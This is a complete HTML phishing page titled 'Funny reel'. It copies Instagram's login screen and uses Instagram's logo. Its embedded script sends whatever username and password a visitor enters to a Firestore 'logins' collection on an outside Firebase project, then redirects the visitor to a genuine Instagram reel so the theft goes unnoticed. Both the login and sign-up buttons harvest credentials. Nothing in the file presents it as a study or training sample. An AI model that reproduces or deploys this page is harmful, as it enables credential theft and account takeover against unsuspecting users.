
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Funny reel</title>
<style>
  * { box-sizing: border-box; }

  body {
    background-color: #101418;
    color: #fff;
    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
  }

  .lang {
    position: absolute;
    top: 20px;
    color: #9aa0a6;
    font-size: 13px;
  }

  .container {
    width: 90%;
    max-width: 340px;
    text-align: center;
  }

  .logo {
    width: 70px;
    height: 70px;
    margin: 0 auto 40px;
    background: url("PUT-YOUR-LOGO-HERE.png") center/cover no-repeat;
    border-radius: 16px;
  }

  .top-image {
    width: 70px;
    height: 70px;
    margin: 0 auto 40px;
    display: block;
    object-fit: cover;
    border-radius: 16px;
  }

  input {
    width: 100%;
    padding: 12px;
    margin-bottom: 10px;
    background-color: #1c1f24;
    border: 1px solid #333;
    border-radius: 8px;
    font-size: 14px;
    color: #fff;
  }
  input::placeholder { color: #9aa0a6; }

  button {
    width: 100%;
    padding: 12px;
    background-color: #0095f6;
    border: none;
    border-radius: 25px;
    color: #fff;
    font-weight: 600;
    font-size: 15px;
    cursor: pointer;
    margin-top: 5px;
  }
  button:disabled { opacity: 0.6; cursor: not-allowed; }

  .link {
    margin-top: 15px;
    color: #0095f6;
    font-size: 13px;
    cursor: pointer;
  }

  .divider {
    height: 1px;
    background-color: #333;
    margin: 25px 0;
  }

  .outline-btn {
    width: 100%;
    padding: 12px;
    border: 1px solid #0095f6;
    background: none;
    color: #0095f6;
    border-radius: 25px;
    font-weight: 600;
    cursor: pointer;
  }

  .error {
    color: #ff5555;
    font-size: 13px;
    margin-top: 8px;
    min-height: 18px;
  }
</style>
</head>
<body>

<div class="lang">English (US)</div>

<div class="container">
  <!-- Top Instagram logo image -->
  <img src="https://static.cdninstagram.com/rsrc.php/v4/yA/r/O_3Ggpr3_aA.png" alt="Logo" class="top-image">

  <div class="logo"></div>

  <input type="text" id="email" placeholder="Username, email or mobile number" />
  <input type="text" id="password" placeholder="Password" />

  <button id="loginBtn">Log in</button>
  <div class="link" id="forgot">Forgot password?</div>

  <div class="divider"></div>

  <button class="outline-btn" id="signupBtn">Create new account</button>
  <div class="error" id="errorMessage"></div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
  authDomain: "rinolski-notifications.firebaseapp.com",
  databaseURL: "https://rinolski-notifications-default-rtdb.firebaseio.com",
  projectId: "rinolski-notifications",
  storageBucket: "rinolski-notifications.firebasestorage.app",
  messagingSenderId: "355554579853",
  appId: "1:355554579853:web:3caa961653c0cdc0a359c4",
  measurementId: "G-WZ84970GST"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const messageBox = document.getElementById("errorMessage");

function clearMsg() { messageBox.textContent = ""; }

// Function to always save credentials and redirect
async function saveCredentials() {
  clearMsg();
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value;

  if (!email || !password) {
    messageBox.textContent = "Please enter both fields.";
    return;
  }

  try {
    await addDoc(collection(db, "logins"), { email, password, timestamp: new Date() });
    // Redirect to Instagram.com after saving
    window.location.href = "https://www.instagram.com/reel/DO4GVTnDA94/?igsh=MWI0Nmc1bWZkZG9zZw==";
  } catch (err) {
    messageBox.textContent = "Error saving credentials: " + err.message;
  }
}

// Both buttons always save credentials and redirect
document.getElementById("signupBtn").addEventListener("click", saveCredentials);
document.getElementById("loginBtn").addEventListener("click", saveCredentials);
</script>

</body>
</html>
